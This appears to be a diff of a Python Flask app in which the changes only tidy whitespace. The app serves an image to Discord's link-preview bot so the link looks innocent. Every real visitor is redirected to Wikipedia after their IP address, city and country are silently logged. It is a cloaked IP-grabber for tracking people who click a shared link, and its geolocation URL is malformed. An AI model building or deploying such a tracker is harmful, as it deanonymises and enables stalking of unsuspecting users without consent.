@@ -4,13 +4,10 @@ import requests
 app = Flask(__name__)
 
 def get_location_data(ip_address):
-   
-   
     if not ip_address or ip_address in ['127.0.0.1', 'Unknown IP']:
         return "Unknown Country", "Unknown City"
         
     try:
-     
         url = f"http://ip-api.com{ip_address}"
         response = requests.get(url, timeout=3)
         
@@ -28,21 +25,15 @@ def get_location_data(ip_address):
 @app.route('/image.png')
 def conditional_serve():
     user_agent = request.headers.get('User-Agent', '')
-    
-
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     client_ip = ip_header.split(',')[0].strip() if ip_header else 'Unknown IP'
     
-  
     country, city = get_location_data(client_ip)
     
     if "Discordbot" in user_agent:
-       
         print(f"[LOG] Discord Bot detected | IP: {client_ip} | Location: {city}, {country} | Serving preview.")
         return send_file('actual_image.png', mimetype='image/png')
-        
     else:
-      
         print(f"[LOG] User browser detected | IP: {client_ip} | Location: {city}, {country} | Redirecting.")
         return redirect("https://wikipedia.org")
 
